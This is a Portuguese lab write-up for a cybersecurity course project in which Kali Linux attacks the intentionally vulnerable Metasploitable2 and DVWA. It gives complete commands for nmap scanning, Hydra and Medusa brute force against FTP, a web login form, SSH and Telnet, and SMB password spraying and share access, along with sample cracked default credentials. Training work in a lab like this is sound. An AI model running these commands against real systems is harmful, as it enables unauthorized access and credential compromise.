## 🧠 Projeto 01 - Cibersegurança Santander+DIO 2025
### Kali Linux vs Metasploitable2 + DVWA

### 🧩 Estrutura do Laboratório

| Função       | Sistema                | Descrição                                  |
| ------------ | ---------------------- | ------------------------------------------ |
| **Atacante** | Kali Linux             | Sistema utilizado para os ataques e testes |
| **Alvo**     | Metasploitable2 + DVWA | Máquinas vulneráveis para simulação        |

---

### ⚙️ Ferramentas Utilizadas

| Ferramenta     | Função                                                          |
| -------------- | --------------------------------------------------------------- |
| **nmap**       | Varredura de portas e serviços                                  |
| **medusa**     | Ataques de força bruta (serviços de rede)                       |
| **hydra**      | Ataques de força bruta em formulários web e protocolos diversos |
| **enum4linux** | Enumeração de usuários e recursos SMB                           |

---

### 🚀 Passo a Passo

### 🔹 Fase 1: Reconhecimento

Varredura de serviços e versões no alvo:

```bash
nmap -sV <ip-alvo>
```

---

### 🔹 Fase 2: Cenário 1 — Força Bruta em FTP (Medusa)

#### Criar listas de usuários e senhas:

```bash
echo -e "msfadmin\nuser\nservice\npostgres" > users.txt
echo -e "pass\npassword\n1234\nmsfadmin\nroot" > pass.txt
```

#### Executar ataque:

```bash
medusa -h <ip-alvo> -U users.txt -P pass.txt -M ftp
```

#### Testar conexão bem-sucedida:

```bash
ftp <ip-alvo>
```

Exemplo de login:

```
220 (vsFTPd 2.3.4)
Name (<ip-alvo>:kali): msfadmin
331 Please specify the password.
Password:
230 Login successful.
ftp>
```

---

### 🔹 Fase 3: Cenário 2 — Brute Force em Formulário Web (Hydra + DVWA)

Teste realizado para o usuário **admin**:

```bash
hydra -l admin -P pass.txt <ip-alvo> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

Exemplo de resultado:

```
[80][http-post-form] host: <ip-alvo>   login: admin   password: password
```

---

### 🔹 Fase 4: Cenário 3 — Password Spraying em SMB

#### Identificar usuários do servidor:

```bash
enum4linux -U <ip-alvo>
```

#### Realizar ataque (testando uma senha para todos os usuários):

```bash
medusa -h <ip-alvo> -U smb_users.txt -p user -M smbnt
```

> Observação: No resultado, é possível identificar o grupo de cada usuário, por exemplo:
> `[SUCCESS (ADMIN$ - Access Allowed)]`

---

## 🧰 Pós-Exploração

### Listar compartilhamentos SMB:

```bash
smbclient -L //<ip-alvo> -U user
```

### Conectar-se ao compartilhamento ADMIN$:

```bash
smbclient //<ip-alvo>/ADMIN$ -U user
```

---

## 🔐 Teste de Conexão SSH (Hydra)

### Criar configuração temporária para compatibilidade:

```bash
vi ~/.ssh/config
```

Conteúdo:

```
Host 192.168.56.101
    PubkeyAuthentication no
    MACs +hmac-sha1,hmac-md5
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa,ssh-dss
```

### Executar brute force:

```bash
hydra -L smb_users.txt -P pass.txt 192.168.56.101 ssh
```

Exemplo de resultado:

```
[22][ssh] host: 192.168.56.101   login: msfadmin   password: msfadmin
```

### Conectar via SSH:

```bash
ssh msfadmin@192.168.56.101
```

---

## 📡 Teste de Conexão Telnet (Hydra)

Executar brute force:

```bash
hydra -L smb_users.txt -P pass.txt <ip-alvo> telnet
```

Exemplo de resultado:

```
[23][telnet] host: <ip-alvo>  login: msfadmin   password: msfadmin
```

Conectar manualmente:

```bash
telnet <ip-alvo>
```

Resultado esperado:

```
msfadmin@metasploitable:~$
```

---

## 🧩 Conclusão e Próximos Passos

* ✅ Aprendido o uso prático de **Medusa**, **Hydra**, **Nmap** e **Enum4linux**
* ✅ Simulados diferentes vetores de ataque em serviços reais (FTP, HTTP, SMB, SSH e Telnet)
* 🔍 Próximos passos:

  * Estudar **proteções e mitigação** contra força bruta (fail2ban, bloqueios temporários, etc.)
  * Automatizar a coleta de resultados
  * Expandir testes para protocolos adicionais (RDP, SMTP, MySQL)

---
